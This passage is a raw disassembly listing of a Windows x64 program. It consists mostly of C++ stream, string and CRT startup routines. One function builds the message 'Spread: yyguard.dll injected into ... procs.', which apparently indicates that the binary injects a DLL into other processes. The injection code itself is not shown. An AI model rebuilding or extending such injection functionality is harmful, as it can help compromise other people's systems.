jmp     short loc_140005992

loc_140005988:
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)

loc_14000598F:          ; Block
mov     rcx, rsi

loc_140005992:
mov     rdx, rdi
call    j_j_free

loc_14000599A:
mov     rax, [rbx+58h]
or      dword ptr [rbx+70h], 1
dec     dword ptr [rax]
mov     rcx, [rbx+40h]
mov     rdx, [rcx]
lea     rax, [rdx+1]
mov     [rcx], rax
mov     eax, r12d
mov     [rdx], r12b
jmp     short loc_1400059BF

loc_1400059BA:
mov     eax, 0FFFFFFFFh

loc_1400059BF:
mov     rbx, [rsp+48h+arg_8]
mov     rbp, [rsp+48h+arg_10]
add     rsp, 20h
pop     r15
pop     r14
pop     r12
pop     rdi
pop     rsi
retn

loc_1400059D6:
call    sub_140001170
db 0CCh
sub_1400057E0 endp

algn_1400059DC:
align 20h



sub_1400059E0 proc near
push    rbx
sub     rsp, 20h
test    byte ptr [rcx+70h], 1
lea     rax, ??_7?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@6B@ ; const std::stringbuf::`vftable'
mov     [rcx], rax
mov     rbx, rcx
jz      short loc_140005A5B
mov     rax, [rcx+40h]
mov     rcx, [rax]
test    rcx, rcx
jz      short loc_140005A11
mov     rax, [rbx+58h]
movsxd  rdx, dword ptr [rax]
add     rdx, rcx
jmp     short loc_140005A1F

loc_140005A11:
mov     rax, [rbx+50h]
movsxd  rdx, dword ptr [rax]
mov     rax, [rbx+38h]
add     rdx, [rax]

loc_140005A1F:
mov     rax, [rbx+18h]
mov     rcx, [rax]
sub     rdx, rcx
cmp     rdx, 1000h
jb      short loc_140005A50
mov     rax, [rcx-8]
sub     rcx, rax
sub     rcx, 8
cmp     rcx, 1Fh
ja      short loc_140005A49
add     rdx, 27h ; '''
jmp     short loc_140005A53

loc_140005A49:
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)

loc_140005A50:
mov     rax, rcx

loc_140005A53:          ; Block
mov     rcx, rax
call    j_j_free

loc_140005A5B:
mov     rax, [rbx+18h]
xor     ecx, ecx
mov     [rax], rcx
mov     rax, [rbx+38h]
mov     [rax], rcx
mov     rax, [rbx+50h]
mov     [rax], ecx
mov     rax, [rbx+20h]
mov     [rax], rcx
mov     rax, [rbx+40h]
mov     [rax], rcx
mov     rax, [rbx+58h]
mov     [rax], ecx
and     dword ptr [rbx+70h], 0FFFFFFFEh
mov     [rbx+68h], rcx
mov     rcx, rbx
add     rsp, 20h
pop     rbx
jmp     cs:??1?$basic_streambuf@DU?$char_traits@D@std@@@std@@UEAA@XZ ; std::streambuf::~streambuf<char,std::char_traits<char>>(void)
sub_1400059E0 endp

algn_140005A9C:
align 20h



sub_140005AA0 proc near

arg_0= qword ptr  8
arg_8= qword ptr  10h

mov     [rsp+arg_0], rbx
mov     [rsp+arg_8], rsi
push    rdi
sub     rsp, 20h
mov     rax, [rcx-98h]
mov     rbx, rcx
mov     edi, edx
movsxd  r8, dword ptr [rax+4]
lea     rax, ??_7?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@6B@ ; const std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`vftable'
mov     [r8+rcx-98h], rax
mov     rax, [rcx-98h]
movsxd  r8, dword ptr [rax+4]
lea     r9d, [r8-98h]
mov     [r8+rcx-9Ch], r9d
add     rcx, 0FFFFFFFFFFFFFF80h
call    sub_1400059E0
lea     rcx, [rbx-78h]
call    cs:??1?$basic_iostream@DU?$char_traits@D@std@@@std@@UEAA@XZ ; std::iostream::~basic_iostream<char,std::char_traits<char>>(void)
mov     rcx, rbx
call    cs:??1?$basic_ios@DU?$char_traits@D@std@@@std@@UEAA@XZ ; std::ios::~ios<char,std::char_traits<char>>(void)
test    dil, 1
jz      short loc_140005B1B
mov     edx, 0F8h
lea     rcx, [rbx-98h]  ; Block
call    j_j_free

loc_140005B1B:
mov     rsi, [rsp+28h+arg_8]
lea     rax, [rbx-98h]
mov     rbx, [rsp+28h+arg_0]
add     rsp, 20h
pop     rdi
retn
sub_140005AA0 endp

algn_140005B32:
align 20h



; __int64 __fastcall sub_140005B40(void *Block)
sub_140005B40 proc near

arg_0= qword ptr  8

mov     [rsp+arg_0], rbx
push    rdi
sub     rsp, 20h
mov     ebx, edx
mov     rdi, rcx
call    sub_1400059E0
test    bl, 1
jz      short loc_140005B66
mov     edx, 78h ; 'x'
mov     rcx, rdi        ; Block
call    j_j_free

loc_140005B66:
mov     rbx, [rsp+28h+arg_0]
mov     rax, rdi
add     rsp, 20h
pop     rdi
retn
sub_140005B40 endp

algn_140005B74:
align 20h



sub_140005B80 proc near

var_48= qword ptr -48h
var_38= qword ptr -38h
var_30= byte ptr -30h
arg_0= qword ptr  8
arg_8= qword ptr  10h
arg_18= dword ptr  20h

; FUNCTION CHUNK AT 0000000140006E96 SIZE 00000006 BYTES
; FUNCTION CHUNK AT 0000000140007358 SIZE 0000003B BYTES

; __unwind { // __CxxFrameHandler4
mov     [rsp+arg_8], rbx
mov     [rsp+arg_0], rcx
push    rsi
push    rdi
push    r12
push    r14
push    r15
sub     rsp, 30h
mov     r15, r8
mov     r12, rdx
mov     rdi, rcx
xor     ebx, ebx
mov     [rsp+58h+arg_18], ebx
mov     rax, [rcx]
movsxd  rcx, dword ptr [rax+4]
mov     rsi, [rcx+rdi+28h]
test    rsi, rsi
jle     short loc_140005BC0
cmp     rsi, r8
jbe     short loc_140005BC0
sub     rsi, r8
jmp     short loc_140005BC2

loc_140005BC0:
xor     esi, esi

loc_140005BC2:
mov     r14, rdi
mov     [rsp+58h+var_38], rdi
mov     rcx, [rcx+rdi+48h]
test    rcx, rcx
jz      short loc_140005BDB
mov     rax, [rcx]
call    qword ptr [rax+8]
nop

loc_140005BDB:
mov     rax, [rdi]
movsxd  rcx, dword ptr [rax+4]
add     rcx, rdi
call    cs:?good@ios_base@std@@QEBA_NXZ ; std::ios_base::good(void)
test    al, al
jnz     short loc_140005BF5
mov     [rsp+58h+var_30], al
jmp     short loc_140005C2E

loc_140005BF5:
mov     rax, [rdi]
movsxd  rcx, dword ptr [rax+4]
mov     rcx, [rcx+rdi+50h]
test    rcx, rcx
jz      short loc_140005C27
cmp     rcx, rdi
jz      short loc_140005C27
call    cs:?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ ; std::ostream::flush(void)
mov     rax, [rdi]
movsxd  rcx, dword ptr [rax+4]
add     rcx, rdi
call    cs:?good@ios_base@std@@QEBA_NXZ ; std::ios_base::good(void)
mov     [rsp+58h+var_30], al
jmp     short loc_140005C2E

loc_140005C27:
mov     [rsp+58h+var_30], 1
mov     al, 1

loc_140005C2E:
test    al, al
jnz     short loc_140005C3C
mov     ebx, 4
jmp     loc_140005CF3

loc_140005C3C:
mov     rdx, [rdi]
movsxd  rax, dword ptr [rdx+4]
mov     ecx, [rax+rdi+18h]
and     ecx, 1C0h
cmp     ecx, 40h ; '@'
jz      short loc_140005CBF

loc_140005C52:
mov     rdx, [rdi]
test    rsi, rsi
jz      short loc_140005CBF
movsxd  rcx, dword ptr [rdx+4]
movzx   edx, byte ptr [rcx+rdi+58h]
mov     rcx, [rcx+rdi+48h]
;   try {
call    cs:?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHD@Z ; std::streambuf::sputc(char)
cmp     eax, 0FFFFFFFFh
jnz     short loc_140005CBA
mov     ebx, 4
mov     [rsp+58h+arg_18], ebx
nop     dword ptr [rax+00h]

loc_140005C80:
test    rsi, rsi
jz      short loc_140005CA8
mov     rax, [rdi]
movsxd  rcx, dword ptr [rax+4]
movzx   edx, byte ptr [rcx+rdi+58h]
mov     rcx, [rcx+rdi+48h]
call    cs:?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHD@Z ; std::streambuf::sputc(char)
cmp     eax, 0FFFFFFFFh
jnz     short loc_140005CE0
or      ebx, 4

loc_140005CA4:
mov     [rsp+58h+arg_18], ebx

loc_140005CA8:
mov     rax, [rdi]
movsxd  rcx, dword ptr [rax+4]
mov     qword ptr [rcx+rdi+28h], 0
;   } // starts at 140005C68
jmp     short loc_140005CF3

loc_140005CBA:
dec     rsi
jmp     short loc_140005C52

loc_140005CBF:
movsxd  rcx, dword ptr [rdx+4]
mov     r8, r15
mov     rdx, r12
mov     rcx, [rcx+rdi+48h]
;   try {
call    cs:?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAA_JPEBD_J@Z ; std::streambuf::sputn(char const *,__int64)
cmp     rax, r15
jz      short loc_140005C80
mov     ebx, 4
jmp     short loc_140005CA4

loc_140005CE0:
dec     rsi
jmp     short loc_140005C80
mov     rdi, [rsp+58h+arg_0]
mov     ebx, [rsp+58h+arg_18]
mov     r14, [rsp+58h+var_38]

loc_140005CF3:
mov     rax, [rdi]
movsxd  rcx, dword ptr [rax+4]
add     rcx, rdi
xor     r8d, r8d
mov     edx, ebx
;   } // starts at 140005CCE
call    cs:?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::ios::setstate(int,bool)
nop
call    cs:?uncaught_exceptions@std@@YAHXZ ; std::uncaught_exceptions(void)
test    eax, eax
jnz     short loc_140005D1D
mov     rcx, r14
call    cs:?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ ; std::ostream::_Osfx(void)
nop

loc_140005D1D:
mov     rax, [r14]
movsxd  rcx, dword ptr [rax+4]
mov     rcx, [rcx+r14+48h]
test    rcx, rcx
jz      short loc_140005D35
mov     rax, [rcx]
call    qword ptr [rax+10h]
nop

loc_140005D35:
mov     rax, rdi
mov     rbx, [rsp+58h+arg_8]
add     rsp, 30h
pop     r15
pop     r14
pop     r12
pop     rdi
pop     rsi
retn
; } // starts at 140005B80
sub_140005B80 endp ; sp-analysis failed

algn_140005D4A:
align 10h



sub_140005D50 proc near

; FUNCTION CHUNK AT 0000000140006E96 SIZE 00000006 BYTES

; __unwind { // __CxxFrameHandler4
push    rbx
sub     rsp, 20h
mov     rbx, rcx
call    cs:?uncaught_exceptions@std@@YAHXZ ; std::uncaught_exceptions(void)
test    eax, eax
jnz     short loc_140005D6D
mov     rcx, [rbx]
call    cs:?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ ; std::ostream::_Osfx(void)
nop

loc_140005D6D:
mov     rdx, [rbx]
mov     rax, [rdx]
movsxd  rcx, dword ptr [rax+4]
mov     rcx, [rcx+rdx+48h]
test    rcx, rcx
jz      short loc_140005D88
mov     rax, [rcx]
call    qword ptr [rax+10h]
nop

loc_140005D88:
add     rsp, 20h
pop     rbx
retn
; } // starts at 140005D50
sub_140005D50 endp

algn_140005D8E:
align 10h



; __int64 __usercall sub_140005D90@<rax>(void *Src@<rcx>, size_t Size)
sub_140005D90 proc near

var_28= qword ptr -28h
var_20= qword ptr -20h
arg_10= qword ptr  18h
arg_18= qword ptr  20h
Size= qword ptr  28h

push    rbx
push    rsi
push    r14
sub     rsp, 30h
mov     r14, [rcx+10h]
mov     rbx, 7FFFFFFFFFFFFFFFh
mov     rax, rbx
mov     rsi, rcx
sub     rax, r14
cmp     rax, rdx
jb      loc_140005F14

loc_140005DB9:
mov     [rsp+48h+arg_10], rbp
mov     rbp, [rcx+18h]
mov     [rsp+48h+arg_18], rdi
mov     [rsp+48h+var_20], r12
mov     [rsp+48h+var_28], r15
lea     r15, [rdx+r14]
mov     rcx, r15
or      rcx, 0Fh
cmp     rcx, rbx
ja      short loc_140005E24
mov     rdx, rbp
mov     rax, rbx
shr     rdx, 1
sub     rax, rdx
cmp     rbp, rax
ja      short loc_140005E24
lea     rax, [rdx+rbp]
mov     rbx, rcx
cmp     rcx, rax
cmovb   rbx, rax
lea     rax, [rbx+1]
test    rax, rax
jnz     short loc_140005E0D
xor     edi, edi
jmp     short loc_140005E59

loc_140005E0D:
cmp     rax, 1000h
jb      short loc_140005E4E
lea     rcx, [rax+27h]
cmp     rcx, rax
jbe     loc_140005F1A
jmp     short loc_140005E32

loc_140005E24:
mov     rcx, 8000000000000000h
add     rcx, 27h ; '''  ; Size

loc_140005E32:
call    sub_1400062C0
test    rax, rax
jz      loc_140005EC1
lea     rdi, [rax+27h]
and     rdi, 0FFFFFFFFFFFFFFE0h
mov     [rdi-8], rax
jmp     short loc_140005E59

loc_140005E4E:          ; Size
mov     rcx, rax
call    sub_1400062C0
mov     rdi, rax

loc_140005E59:
mov     r12, [rsp+48h+Size]
mov     r8, r14         ; Size
mov     [rsi+10h], r15
lea     r15, [rdi+r14]
mov     [rsi+18h], rbx
mov     rcx, rdi        ; void *
cmp     rbp, 0Fh
jbe     short loc_140005ED2
mov     rbx, [rsi]
mov     rdx, rbx        ; Src
call    memcpy
mov     r8, r12         ; Size
lea     rdx, aProcs     ; " procs."
mov     rcx, r15        ; void *
call    memcpy
lea     rdx, [rbp+1]
mov     byte ptr [r15+r12], 0
cmp     rdx, 1000h
jb      short loc_140005EC8
mov     rcx, [rbx-8]    ; Block
sub     rbx, rcx
sub     rbx, 8
cmp     rbx, 1Fh
ja      short loc_140005EC1
lea     rdx, [rbp+28h]
call    j_j_free
jmp     short loc_140005EF1

loc_140005EC1:
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)

loc_140005EC8:          ; Block
mov     rcx, rbx
call    j_j_free
jmp     short loc_140005EF1

loc_140005ED2:          ; Src
mov     rdx, rsi
call    memcpy
mov     r8, r12         ; Size
lea     rdx, aProcs     ; " procs."
mov     rcx, r15        ; void *
call    memcpy
mov     byte ptr [r15+r12], 0

loc_140005EF1:
mov     [rsi], rdi
mov     rax, rsi
mov     r12, [rsp+48h+var_20]
mov     rdi, [rsp+48h+arg_18]
mov     rbp, [rsp+48h+arg_10]
mov     r15, [rsp+48h+var_28]
add     rsp, 30h
pop     r14
pop     rsi
pop     rbx
retn

loc_140005F14:
call    sub_140001210
align 2

loc_140005F1A:
call    sub_140001170
align 20h
sub_140005D90 endp




sub_140005F20 proc near
; __unwind { // __CxxFrameHandler4
sub     rsp, 28h
mov     rdx, [rcx]
mov     rax, [rdx]
movsxd  rcx, dword ptr [rax+4]
mov     rcx, [rcx+rdx+48h]
test    rcx, rcx
jz      short loc_140005F3F
mov     rax, [rcx]
call    qword ptr [rax+10h]
nop

loc_140005F3F:
add     rsp, 28h
retn
; } // starts at 140005F20
sub_140005F20 endp

algn_140005F44:
align 10h



; __int64 __usercall sub_140005F50@<rax>(void *Src@<rcx>, int, size_t Size)
sub_140005F50 proc near

var_28= qword ptr -28h
var_20= qword ptr -20h
arg_10= qword ptr  18h
Size= qword ptr  30h

push    rbx
push    rsi
push    r14
sub     rsp, 30h
mov     r14, [rcx+10h]
mov     rbx, 7FFFFFFFFFFFFFFFh
mov     rax, rbx
mov     rsi, rcx
sub     rax, r14
cmp     rax, rdx
jb      loc_1400060B4

loc_140005F79:
mov     [rsp+48h+arg_10], rbp
mov     rbp, [rcx+18h]
mov     [rsp+48h+var_20], rdi
mov     [rsp+48h+var_28], r15
lea     r15, [rdx+r14]
mov     rcx, r15
or      rcx, 0Fh
cmp     rcx, rbx
ja      short loc_140005FDF
mov     rdx, rbp
mov     rax, rbx
shr     rdx, 1
sub     rax, rdx
cmp     rbp, rax
ja      short loc_140005FDF
lea     rax, [rdx+rbp]
mov     rbx, rcx
cmp     rcx, rax
cmovb   rbx, rax
lea     rax, [rbx+1]
test    rax, rax
jnz     short loc_140005FC8
xor     edi, edi
jmp     short loc_140006010

loc_140005FC8:
cmp     rax, 1000h
jb      short loc_140006005
lea     rcx, [rax+27h]
cmp     rcx, rax
jbe     loc_1400060BA
jmp     short loc_140005FED

loc_140005FDF:
mov     rcx, 8000000000000000h
add     rcx, 27h ; '''  ; Size

loc_140005FED:
call    sub_1400062C0
test    rax, rax
jz      short loc_140006071
lea     rdi, [rax+27h]
and     rdi, 0FFFFFFFFFFFFFFE0h
mov     [rdi-8], rax
jmp     short loc_140006010

loc_140006005:          ; Size
mov     rcx, rax
call    sub_1400062C0
mov     rdi, rax

loc_140006010:          ; Size
mov     r8, [rsp+48h+Size]
lea     rdx, aSpreadYyguardD ; "Spread: yyguard.dll injected into "
mov     [rsi+10h], r15
mov     rcx, rdi        ; void *
mov     [rsi+18h], rbx
lea     r15, [rdi+r8]
cmp     rbp, 0Fh
jbe     short loc_140006082
mov     rbx, [rsi]
call    memcpy
lea     r8, [r14+1]     ; Size
mov     rdx, rbx        ; Src
mov     rcx, r15        ; void *
call    memcpy
lea     rdx, [rbp+1]
cmp     rdx, 1000h
jb      short loc_140006078
mov     rcx, [rbx-8]    ; Block
sub     rbx, rcx
sub     rbx, 8
cmp     rbx, 1Fh
ja      short loc_140006071
lea     rdx, [rbp+28h]
call    j_j_free
jmp     short loc_140006096

loc_140006071:
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)

loc_140006078:          ; Block
mov     rcx, rbx
call    j_j_free
jmp     short loc_140006096

loc_140006082:
call    memcpy
lea     r8, [r14+1]     ; Size
mov     rdx, rsi        ; Src
mov     rcx, r15        ; void *
call    memcpy

loc_140006096:
mov     [rsi], rdi
mov     rax, rsi
mov     rdi, [rsp+48h+var_20]
mov     rbp, [rsp+48h+arg_10]
mov     r15, [rsp+48h+var_28]
add     rsp, 30h
pop     r14
pop     rsi
pop     rbx
retn

loc_1400060B4:
call    sub_140001210
align 2

loc_1400060BA:
call    sub_140001170
align 20h
sub_140005F50 endp




sub_1400060C0 proc near

arg_18= qword ptr  20h

push    rbx
push    rbp
push    rsi
push    rdi
push    r15
sub     rsp, 20h
mov     rbp, [rcx+18h]
mov     rsi, r8
mov     r15, rdx
mov     rbx, rcx
cmp     r8, rbp
ja      short loc_140006109
cmp     rbp, 0Fh
jbe     short loc_1400060E8
mov     rdi, [rcx]
jmp     short loc_1400060EB

loc_1400060E8:
mov     rdi, rbx

loc_1400060EB:
mov     [rcx+10h], rsi
mov     rcx, rdi        ; void *
call    memmove
mov     rax, rbx
mov     byte ptr [rsi+rdi], 0
add     rsp, 20h
pop     r15
pop     rdi
pop     rsi
pop     rbp
pop     rbx
retn

loc_140006109:
mov     rdi, 7FFFFFFFFFFFFFFFh
cmp     rsi, rdi
ja      loc_140006212
mov     rcx, rsi

loc_14000611F:
mov     [rsp+48h+arg_18], r14
or      rcx, 0Fh
cmp     rcx, rdi
ja      short loc_140006171
mov     rdx, rbp
mov     rax, rdi
shr     rdx, 1
sub     rax, rdx
cmp     rbp, rax
ja      short loc_140006171
lea     rax, [rdx+rbp]
mov     rdi, rcx
cmp     rcx, rax
cmovb   rdi, rax
lea     rax, [rdi+1]
test    rax, rax
jnz     short loc_14000615A
xor     r14d, r14d
jmp     short loc_1400061A2

loc_14000615A:
cmp     rax, 1000h
jb      short loc_140006197
lea     rcx, [rax+27h]
cmp     rcx, rax
jbe     loc_140006218
jmp     short loc_14000617F

loc_140006171:
mov     rcx, 8000000000000000h
add     rcx, 27h ; '''  ; Size

loc_14000617F:
call    sub_1400062C0
test    rax, rax
jz      short loc_1400061EA
lea     r14, [rax+27h]
and     r14, 0FFFFFFFFFFFFFFE0h
mov     [r14-8], rax
jmp     short loc_1400061A2

loc_140006197:          ; Size
mov     rcx, rax
call    sub_1400062C0
mov     r14, rax

loc_1400061A2:          ; Size
mov     r8, rsi
mov     [rbx+10h], rsi
mov     rdx, r15        ; Src
mov     [rbx+18h], rdi
mov     rcx, r14        ; void *
call    memcpy
mov     byte ptr [r14+rsi], 0
cmp     rbp, 0Fh
jbe     short loc_1400061FC
mov     rcx, [rbx]
lea     rdx, [rbp+1]
cmp     rdx, 1000h
jb      short loc_1400061F1
mov     rax, [rcx-8]
sub     rcx, rax
sub     rcx, 8
cmp     rcx, 1Fh
ja      short loc_1400061EA
lea     rdx, [rbp+28h]
jmp     short loc_1400061F4

loc_1400061EA:
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)

loc_1400061F1:
mov     rax, rcx

loc_1400061F4:          ; Block
mov     rcx, rax
call    j_j_free

loc_1400061FC:
mov     [rbx], r14
mov     rax, rbx
mov     r14, [rsp+48h+arg_18]
add     rsp, 20h
pop     r15
pop     rdi
pop     rsi
pop     rbp
pop     rbx
retn

loc_140006212:
call    sub_140001210
align 8

loc_140006218:
call    sub_140001170
db 0CCh
sub_1400060C0 endp

algn_14000621E:
align 20h



sub_140006220 proc near
movsxd  rax, dword ptr [rcx-4]
sub     rcx, rax
jmp     sub_140005AA0
sub_140006220 endp

; [00000006 BYTES: COLLAPSED FUNCTION std::streambuf::_Lock(void)]
; [00000006 BYTES: COLLAPSED FUNCTION std::streambuf::_Unlock(void)]
; [00000006 BYTES: COLLAPSED FUNCTION std::streambuf::showmanyc(void)]
; [00000006 BYTES: COLLAPSED FUNCTION std::streambuf::uflow(void)]
; [00000006 BYTES: COLLAPSED FUNCTION std::streambuf::xsgetn(char *,__int64)]
; [00000006 BYTES: COLLAPSED FUNCTION std::streambuf::xsputn(char const *,__int64)]
; [00000006 BYTES: COLLAPSED FUNCTION std::streambuf::setbuf(char *,__int64)]
; [00000006 BYTES: COLLAPSED FUNCTION std::streambuf::sync(void)]
; [00000006 BYTES: COLLAPSED FUNCTION std::streambuf::imbue(std::locale const &)]
align 20h
; [0000001E BYTES: COLLAPSED FUNCTION __security_check_cookie]
algn_14000629E:
align 20h
; [00000007 BYTES: COLLAPSED FUNCTION __report_gsfailure]
retn
align 10h
; [00000007 BYTES: COLLAPSED FUNCTION __report_rangecheckfailure]
retn
align 20h



; __int64 __fastcall sub_1400062C0(size_t Size)
sub_1400062C0 proc near
push    rbx
sub     rsp, 20h
mov     rbx, rcx
call    malloc
test    rax, rax
jnz     short loc_1400062EC

loc_1400062D3:          ; Size
mov     rcx, rbx
call    _callnewh
test    eax, eax
jz      short loc_1400062F2
mov     rcx, rbx        ; Size
call    malloc
test    rax, rax
jz      short loc_1400062D3

loc_1400062EC:
add     rsp, 20h
pop     rbx
retn

loc_1400062F2:
cmp     rbx, 0FFFFFFFFFFFFFFFFh
jz      short loc_1400062FE
call    sub_140006630
align 2

loc_1400062FE:
call    sub_140001170
db 0CCh
sub_1400062C0 endp

algn_140006304:
align 10h
; [00000005 BYTES: COLLAPSED FUNCTION j_free]
align 20h
; [00000005 BYTES: COLLAPSED FUNCTION j_j_free]
align 10h


; Attributes: thunk

; __int64 __fastcall sub_140006330(size_t Size)
sub_140006330 proc near
jmp     sub_1400062C0
sub_140006330 endp

align 20h



sub_140006340 proc near
push    rbx
sub     rsp, 20h
lea     rax, ??_7type_info@@6B@ ; const type_info::`vftable'
mov     rbx, rcx
mov     [rcx], rax
test    dl, 1
jz      short loc_140006362
mov     edx, 18h
call    j_j_free

loc_140006362:
mov     rax, rbx
add     rsp, 20h
pop     rbx
retn
sub_140006340 endp

algn_14000636B:
align 10h



sub_140006370 proc near
push    rbx
sub     rsp, 20h
mov     ecx, 1          ; Type
call    _set_app_type
call    sub_1400069A0
mov     ecx, eax        ; Mode
call    _set_fmode
call    UserMathErrorFunction
mov     ebx, eax
call    __p__commode
mov     ecx, 1
mov     [rax], ebx
call    sub_1400066E0
test    al, al
jz      short loc_14000641B
call    sub_140006B30
lea     rcx, Function   ; Function
call    sub_140006880
call    sub_140006990
mov     ecx, eax        ; mode
call    _configure_narrow_argv
test    eax, eax
jnz     short loc_14000641B
call    sub_1400069B0
call    sub_140006A10
test    eax, eax
jz      short loc_1400063E3
lea     rcx, UserMathErrorFunction ; UserMathErrorFunction
call    __setusermatherr

loc_1400063E3:
call    _guard_check_icall_nop
call    _guard_check_icall_nop
call    UserMathErrorFunction
mov     ecx, eax        ; Flag
call    _configthreadlocale
call    sub_1400069C0
test    al, al
jz      short loc_140006407
call    _initialize_narrow_environment

loc_140006407:
call    UserMathErrorFunction
call    j_UserMathErrorFunction
test    eax, eax
jnz     short loc_14000641B
add     rsp, 20h
pop     rbx
retn

loc_14000641B:
mov     ecx, 7
call    RtlFailFast
db 0CCh
sub_140006370 endp

algn_140006426:
align 10h



sub_140006430 proc near
sub     rsp, 28h
call    sub_1400069F0
xor     eax, eax
add     rsp, 28h
retn
sub_140006430 endp




sub_140006440 proc near
sub     rsp, 28h
call    sub_140006AC0
call    UserMathErrorFunction
mov     ecx, eax        ; NewMode
add     rsp, 28h
jmp     _set_new_mode
sub_140006440 endp

algn_140006459:
align 20h



sub_140006460 proc near

var_18= byte ptr -18h
arg_0= qword ptr  8
arg_8= qword ptr  10h

; FUNCTION CHUNK AT 00000001400065D7 SIZE 00000007 BYTES
; FUNCTION CHUNK AT 00000001400073A0 SIZE 0000001E BYTES

; __unwind { // __C_specific_handler
mov     [rsp+arg_0], rbx
mov     [rsp+arg_8], rsi
push    rdi
sub     rsp, 30h
mov     ecx, 1
call    sub_1400066A0
test    al, al
jz      loc_1400065BA
xor     sil, sil
mov     [rsp+38h+var_18], sil

loc_140006489:
;   __try { // __except at loc_140006591
call    sub_140006650
movzx   ebx, al
mov     ecx, cs:dword_14000C470
cmp     ecx, 1
jz      loc_1400065C5
test    ecx, ecx
jnz     short loc_1400064EE
mov     cs:dword_14000C470, 1
lea     rdx, Last       ; Last
lea     rcx, First      ; First
call    _initterm_e
test    eax, eax
jz      short loc_1400064CF
mov     eax, 0FFh
jmp     loc_1400065AA

loc_1400064CF:          ; Last
lea     rdx, qword_140008568
lea     rcx, qword_140008558 ; First
call    _initterm
mov     cs:dword_14000C470, 2
jmp     short loc_1400064F6

loc_1400064EE:
mov     sil, 1
mov     [rsp+38h+var_18], sil

loc_1400064F6:
movzx   ecx, bl
call    sub_140006820
call    sub_140006A20
mov     rbx, rax
cmp     qword ptr [rax], 0
jz      short loc_14000652B
mov     rcx, rax
call    sub_140006780
test    al, al
jz      short loc_14000652B
xor     r8d, r8d
mov     edx, 2
xor     ecx, ecx
mov     rax, [rbx]
call    cs:__guard_dispatch_icall_fptr

loc_14000652B:
call    sub_140006A30
mov     rbx, rax
cmp     qword ptr [rax], 0
jz      short loc_14000654D
mov     rcx, rax
call    sub_140006780
test    al, al
jz      short loc_14000654D
mov     rcx, [rbx]      ; Callback
call    _register_thread_local_exe_atexit_callback

loc_14000654D:
call    _get_initial_narrow_environment
mov     rdi, rax
call    __p___argv
mov     rbx, [rax]
call    __p___argc
mov     r8, rdi
mov     rdx, rbx
mov     ecx, [rax]
call    sub_1400048B0
mov     ebx, eax
call    sub_140006A60
test    al, al
jz      short loc_1400065CF
test    sil, sil
jnz     short loc_140006584
call    _cexit

loc_140006584:
xor     edx, edx
mov     cl, 1
call    sub_140006850
mov     eax, ebx
jmp     short loc_1400065AA
;   } // starts at 140006489

loc_140006591:
;   __except(loc_1400073A0) // owned by 140006489
;   __except(loc_1400073A0) // owned by 1400065C5
mov     ebx, eax
call    sub_140006A60
test    al, al
jz      short loc_1400065D7
cmp     [rsp+38h+var_18], 0
jnz     short loc_1400065A8
call    _c_exit

loc_1400065A8:
mov     eax, ebx

loc_1400065AA:
mov     rbx, [rsp+38h+arg_0]
mov     rsi, [rsp+38h+arg_8]
add     rsp, 30h
pop     rdi
retn

loc_1400065BA:
mov     ecx, 7
call    RtlFailFast
db 90h

loc_1400065C5:
;   __try { // __except at loc_140006591
mov     ecx, 7
call    RtlFailFast

loc_1400065CF:          ; Code
mov     ecx, ebx
call    exit
sub_140006460 endp

db 90h
;   } // starts at 1400065C5
; START OF FUNCTION CHUNK FOR sub_140006460

loc_1400065D7:          ; Code
mov     ecx, ebx
call    _exit
; END OF FUNCTION CHUNK FOR sub_140006460
db 90h
; } // starts at 140006460
algn_1400065DF:
align 20h
; [00000012 BYTES: COLLAPSED FUNCTION start]
algn_1400065F2:
align 20h



sub_140006600 proc near
lea     rax, aBadAllocation ; "bad allocation"
mov     qword ptr [rcx+10h], 0
mov     [rcx+8], rax
lea     rax, ??_7bad_alloc@std@@6B@ ; const std::bad_alloc::`vftable'
mov     [rcx], rax
mov     rax, rcx
retn
sub_140006600 endp

align 10h


; Attributes: noreturn

sub_140006630 proc near

pExceptionObject= byte ptr -28h

sub     rsp, 48h
lea     rcx, [rsp+48h+pExceptionObject]
call    sub_140006600
lea     rdx, __TI2?AVbad_alloc@std@@ ; pThrowInfo
lea     rcx, [rsp+48h+pExceptionObject] ; pExceptionObject
call    _CxxThrowException
align 10h
sub_140006630 endp




sub_140006650 proc near
sub     rsp, 28h
call    sub_140006E80
test    eax, eax
jz      short loc_140006689
mov     rax, gs:30h
mov     rcx, [rax+8]
xor     eax, eax
lock cmpxchg cs:qword_14000C478, rcx
jz      short loc_140006689

loc_140006677:
cmp     rcx, rax
jz      short loc_140006690
xor     eax, eax
lock cmpxchg cs:qword_14000C478, rcx
jnz     short loc_140006677

loc_140006689:
xor     al, al
add     rsp, 28h
retn

loc_140006690:
mov     al, 1
add     rsp, 28h
retn
sub_140006650 endp

algn_140006697:
align 20h



sub_1400066A0 proc near
sub     rsp, 28h
test    ecx, ecx
jnz     short loc_1400066AF
mov     cs:byte_14000C480, 1

loc_1400066AF:
call    sub_140006BD0
call    sub_1400069C0
test    al, al
jz      short loc_1400066CD
call    sub_1400069C0
test    al, al
jnz     short loc_1400066D4
xor     ecx, ecx
call    sub_1400069C0

loc_1400066CD:
xor     al, al
add     rsp, 28h
retn

loc_1400066D4:
mov     al, 1
add     rsp, 28h
retn
sub_1400066A0 endp

algn_1400066DB:
align 20h



sub_1400066E0 proc near
push    rbx
sub     rsp, 20h
cmp     cs:byte_14000C481, 0
mov     ebx, ecx
jnz     short loc_140006760
cmp     ecx, 1
ja      short loc_140006768
call    sub_140006E80
test    eax, eax
jz      short loc_14000672B
test    ebx, ebx
jnz     short loc_14000672B
lea     rcx, Table      ; Table
call    _initialize_onexit_table
test    eax, eax
